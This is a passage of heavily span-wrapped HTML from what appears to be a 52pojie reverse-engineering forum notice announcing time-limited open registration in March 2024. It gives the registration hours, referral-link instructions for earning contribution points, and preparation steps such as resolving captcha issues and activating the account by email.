initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">官</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">博</span><span style="display: inline-block; text-indent: initial;">收</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">朋</span><span style="display: inline-block; text-indent: initial;">友</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">消</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">想</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">习</span><span style="display: inline-block; text-indent: initial;">交</span><span style="display: inline-block; text-indent: initial;">流</span></span><span><span style="display: inline-block; text-indent: initial;">逆</span><span style="display: inline-block; text-indent: initial;">向</span><span style="display: inline-block; text-indent: initial;">分</span><span style="display: inline-block; text-indent: initial;">析</span></span><span><span style="display: inline-block; text-indent: initial;">技</span><span style="display: inline-block; text-indent: initial;">术</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">让</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">生</span><span style="display: inline-block; text-indent: initial;">血</span><span style="display: inline-block; text-indent: initial;">液</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">商</span><span style="display: inline-block; text-indent: initial;">议</span><span style="display: inline-block; text-indent: initial;">决</span><span style="display: inline-block; text-indent: initial;">定</span><span style="display: inline-block; text-indent: initial;">限</span><span style="display: inline-block; text-indent: initial;">时</span></span><span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></span><span><span style="display: inline-block; text-indent: initial;">。</span></span></span></p><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">关</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">官</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">随</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">等</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">每</span><span style="display: inline-block; text-indent: initial;">天</span><span style="display: inline-block; text-indent: initial;">签</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">C</span><span style="display: inline-block; text-indent: initial;">B</span><span style="display: inline-block; text-indent: initial;">！</span></span></strong></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">避</span><span style="display: inline-block; text-indent: initial;">免</span><span style="display: inline-block; text-indent: initial;">由</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">负</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">影</span><span style="display: inline-block; text-indent: initial;">响</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">强</span><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">。</span><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">甲</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">从</span><span style="display: inline-block; text-indent: initial;">事</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">行</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">情</span><span style="display: inline-block; text-indent: initial;">况</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">采</span><span style="display: inline-block; text-indent: initial;">取</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">严</span><span style="display: inline-block; text-indent: initial;">格</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">处</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">措</span><span style="display: inline-block; text-indent: initial;">施</span><span style="display: inline-block; text-indent: initial;">。</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">您</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">认</span><span style="display: inline-block; text-indent: initial;">真</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">须</span><span style="display: inline-block; text-indent: initial;">知</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">及</span><span style="display: inline-block; text-indent: initial;">社</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">总</span><span style="display: inline-block; text-indent: initial;">版</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">便</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">地</span><span style="display: inline-block; text-indent: initial;">适</span><span style="display: inline-block; text-indent: initial;">应</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">享</span><span style="display: inline-block; text-indent: initial;">受</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">社</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">具</span><span style="display: inline-block; text-indent: initial;">体</span><span style="display: inline-block; text-indent: initial;">限</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"></span></p><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">24</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">13</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">：</span></span></strong><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span></span></strong></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">邀</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">得</span><span style="display: inline-block; text-indent: initial;">贡</span><span style="display: inline-block; text-indent: initial;">献</span></h2><ul class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-size: 14px;"><span style="font-size: 14px; font-weight: 700;">大家可以推荐自己的朋友注册</span>，从而增加自己的<span style="font-size: 14px; font-weight: 700;">贡献值</span>，只要通过你推荐的地址注册，你就会增加一个贡献值，注册完可以炫耀一下贡献值啦，你可以把我的账号改成你的账号就是你的推广地址啦，比如我的推广地址可以是以下链接：</span></p><blockquote style="margin-top: 0px; margin-bottom: 0px; color: rgb(106, 115, 125); padding-top: 0px; padding-right: 1em; padding-left: 1em; border-left-width: 0.25em; border-left-color: rgb(223, 226, 229);"><p style="margin-bottom: 15px;"><span style="font-size: 14px;">https://www.52pojie.cn/?fromuser=LCG</span><span style="font-size: 14px;"> 【把LCG换成自己的账号即可】</span></p><p><span style="font-size: 14px;">https://www.52pojie.cn/?fromuid=14</span><span style="font-size: 14px;"> 【把14换成自己的UID即可，UID查看：</span><span style="font-size: 14px;">https://www.52pojie.cn/home.php?mod=space&amp;do=profile</span><span style="font-size: 14px;"> 】</span></p></blockquote></li></ul><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">准</span><span style="display: inline-block; text-indent: initial;">备</span><span style="display: inline-block; text-indent: initial;">什</span><span style="display: inline-block; text-indent: initial;">么</span><span style="display: inline-block; text-indent: initial;">？</span></span></h2><ol class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">★</span><span style="display: inline-block; text-indent: initial;">★</span><span style="display: inline-block; text-indent: initial;">★</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">优</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;"> </span><strong style="line-height: 1.6;"><span style="color: rgb(255, 0, 0); line-height: 1.6;"><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">异</span><span style="display: inline-block; text-indent: initial;">常</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">、</span><span style="display: inline-block; text-indent: initial;">等</span><span style="display: inline-block; text-indent: initial;">待</span><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">员</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">、</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span></span></strong><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">速</span><span style="display: inline-block; text-indent: initial;">准</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">参</span><span style="display: inline-block; text-indent: initial;">看</span><span style="display: inline-block; text-indent: initial;">地</span><span style="display: inline-block; text-indent: initial;">址</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">需</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">认</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">箱</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">否</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">选</span><span style="display: inline-block; text-indent: initial;">择</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">使</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">页</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">E</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">l</span><span style="display: inline-block; text-indent: initial;">栏</span><span style="display: inline-block; text-indent: initial;">输</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">想</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">果</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">使</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">提</span><span style="display: inline-block; text-indent: initial;">示</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">预</span><span style="display: inline-block; text-indent: initial;">祝</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">独</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">二</span><span style="display: inline-block; text-indent: initial;">！</span></span></p></li><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">查</span><span style="display: inline-block; text-indent: initial;">看</span><span style="display: inline-block; text-indent: initial;">系</span><span style="display: inline-block; text-indent: initial;">统</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">否</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">包</span><span style="display: inline-block; text-indent: initial;">括</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">分</span><span style="display: inline-block; text-indent: initial;">钟</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">果</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">造</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">输</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">空</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">浏</span><span style="display: inline-block; text-indent: initial;">览</span><span style="display: inline-block; text-indent: initial;">器</span><span style="display: inline-block; text-indent: initial;">缓</span><span style="display: inline-block; text-indent: initial;">存</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">k</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">三</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">做</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">最</span><span style="display: inline-block; text-indent: initial;">重</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">第</span><span style="display: inline-block; text-indent: initial;">四</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">箱</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><strong style="line-height: 1.6;"><span style="color: rgb(0, 0, 255); line-height: 1.6;"><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">需</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">域</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: 